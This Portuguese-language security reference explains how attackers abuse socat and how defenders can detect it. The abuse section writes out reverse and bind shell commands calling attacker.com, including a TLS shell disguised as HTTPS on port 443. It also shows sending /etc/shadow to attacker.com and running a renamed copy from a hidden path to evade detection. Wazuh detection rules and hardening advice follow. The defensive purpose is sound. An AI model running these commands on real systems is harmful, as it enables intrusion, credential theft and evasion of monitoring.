# socat

**Plataforma:** Linux / macOS

**Categorias:** Shell reverso, Bind shell, Transferência de arquivos, Relay/pivoting, Tunelamento TLS

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1105 (Ingress Tool Transfer), T1048 (Exfiltration), T1090 (Proxy)

**Referência ofensiva:** https://gtfobins.org/gtfobins/socat/

---

## O que é o socat

O socat (SOcket CAT) é uma ferramenta de relay bidirecional de dados entre dois canais independentes. É significativamente mais poderoso que o netcat, pois suporta praticamente qualquer tipo de canal: TCP, UDP, sockets Unix, pipes, arquivos, pseudoterminais (PTY), SSL/TLS e muito mais.

O socat não está instalado por padrão na maioria das distribuições, mas é facilmente instalável via gerenciador de pacotes e frequentemente presente em ambientes de desenvolvimento e servidores onde administradores o instalaram para diagnóstico. A sua presença é um indicador relevante por si só em servidores de produção que não têm necessidade documentada da ferramenta.

---

## Por que atacantes usam o socat

O socat resolve duas limitações importantes do netcat: a incapacidade de criar pseudoterminais reais (PTY) e a falta de suporte nativo a TLS. Com socat, o atacante consegue um shell reverso completamente interativo com suporte a terminal completo (tab completion, Ctrl+C funcional, redimensionamento de janela) cifrado com TLS, tornando o tráfego indistinguível de uma conexão HTTPS legítima para soluções que não fazem inspeção profunda.

Em campanhas avançadas onde o tráfego de rede é monitorado, o socat com TLS é preferido ao netcat puro justamente por essa razão.

---

## Técnicas de abuso

### Shell reverso simples

```bash
# Listener no servidor do atacante
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Na vítima
socat TCP:attacker.com:4444 EXEC:/bin/bash
```

### Shell reverso com PTY — terminal completamente interativo

Esta é a técnica mais valorizada com socat: cria um pseudoterminal real, não apenas um pipe de stdin/stdout.

```bash
# Listener no atacante (com PTY)
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Na vítima
socat TCP:attacker.com:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

A opção `pty` cria um pseudoterminal real. `sane` normaliza as configurações do terminal. `sigint` permite que Ctrl+C funcione no processo remoto em vez de encerrar a conexão. O resultado é um shell indistinguível de uma sessão SSH do ponto de vista da usabilidade.

### Shell reverso com TLS — tráfego cifrado

```bash
# Gerar certificado autoassinado (feito uma vez no servidor do atacante)
openssl req -newkey rsa:2048 -nodes -keyout /tmp/server.key -x509 -days 365 -out /tmp/server.crt -subj "/CN=attacker"
cat /tmp/server.key /tmp/server.crt > /tmp/server.pem

# Listener TLS no atacante
socat OPENSSL-LISTEN:443,cert=/tmp/server.pem,verify=0,fork EXEC:/bin/bash

# Na vítima — conecta via TLS (porta 443, parece HTTPS)
socat OPENSSL:attacker.com:443,verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

Com essa técnica, a conexão de saída do alvo para o atacante usa a porta 443 com TLS. Para soluções de segurança que não fazem SSL inspection com validação de certificado, o tráfego é invisível.

### Transferência de arquivos

```bash
# Receptor
socat TCP-LISTEN:9001,reuseaddr > arquivo_recebido

# Emissor
socat TCP:attacker.com:9001 < /etc/shadow
```

### Relay e pivoting entre redes

```bash
# Relay: tudo que chega na porta local 8080 é encaminhado para 192.168.1.100:80
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# Relay com TLS na entrada e TCP na saída (útil para contornar inspeção SSL)
socat OPENSSL-LISTEN:443,cert=/tmp/server.pem,verify=0,fork TCP:192.168.1.100:8080
```

### Bind shell

```bash
# Vítima abre porta e aguarda conexão
socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash,pty,stderr

# Atacante conecta
socat - TCP:192.168.1.50:5555
```

---

## Técnicas de bypass e evasão

### Uso de porta 443 com TLS para parecer tráfego HTTPS

Como demonstrado acima, a combinação OPENSSL + porta 443 torna o tráfego praticamente indistinguível de HTTPS legítimo para soluções sem SSL inspection configurada com verificação de certificado.

### Execução a partir de diretório não-padrão

```bash
# Copiar para diretório oculto e executar com nome diferente
cp /usr/bin/socat /tmp/.cache_helper
/tmp/.cache_helper TCP:attacker.com:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- socat com argumento `EXEC:` seguido de shell ou interpretador
- socat com `OPENSSL` em conexão para IP externo (shell reverso TLS)
- socat em modo `TCP-LISTEN` com `EXEC:` (bind shell)
- socat executado por processo filho de servidor web

**Indicadores de média relevância:**

- socat em modo `OPENSSL-LISTEN` em servidor de produção
- socat com argumento `fork` em produção (relay ativo)
- Presença do binário socat em servidor que não tem necessidade documentada

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0100-gtfobins_network.xml -->

<!-- socat com EXEC de shell -->
<rule id="100219" level="15">
  <if_group>auditd</if_group>
  <field name="audit.command">socat</field>
  <field name="audit.execve" type="pcre2">EXEC:.*(/bin/bash|/bin/sh|python|perl)</field>
  <description>socat executando shell — shell reverso ou bind shell ativo</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- socat com TLS para exterior -->
<rule id="100220" level="13">
  <if_group>auditd</if_group>
  <field name="audit.command">socat</field>
  <field name="audit.execve" type="pcre2">OPENSSL:</field>
  <description>socat com TLS para destino externo — possivel shell reverso cifrado</description>
  <mitre>
    <id>T1059.004</id>
    <id>T1573</id>
  </mitre>
</rule>

<!-- socat executado por conta de serviço web -->
<rule id="100221" level="14">
  <if_group>auditd</if_group>
  <field name="audit.command">socat</field>
  <field name="audit.uid" type="pcre2">^(33|65534|99)$</field>
  <description>socat executado por conta de servico web — possivel RCE</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Administradores de rede e segurança** — o socat é usado para tunelamento e diagnóstico legítimo. Em servidores de produção, documente os casos de uso legítimos e filtre por usuário e destino específicos.

**Ferramentas de automação de rede** — alguns scripts de automação e monitoramento usam socat para relay. Identifique e documente esses casos para criar exceções específicas.

---

## Proteção e controles defensivos

**Inventariar e remover o socat de servidores sem necessidade:** ao contrário do netcat, o socat raramente é uma dependência de outras ferramentas e pode ser removido com segurança na maioria dos servidores de produção. Execute `dpkg -l | grep socat` ou `rpm -qa | grep socat` para verificar.

**SSL inspection com validação de certificado:** para detectar shells reversos TLS via socat na porta 443, o proxy corporativo precisa fazer SSL inspection com validação de cadeia de certificados. Conexões com certificados autoassinados ou cadeias desconhecidas devem gerar alerta.

---

## Referências

- GTFOBins — socat: https://gtfobins.org/gtfobins/socat/
- MITRE ATT&CK T1059.004: https://attack.mitre.org/techniques/T1059/004/
- MITRE ATT&CK T1573: https://attack.mitre.org/techniques/T1573/
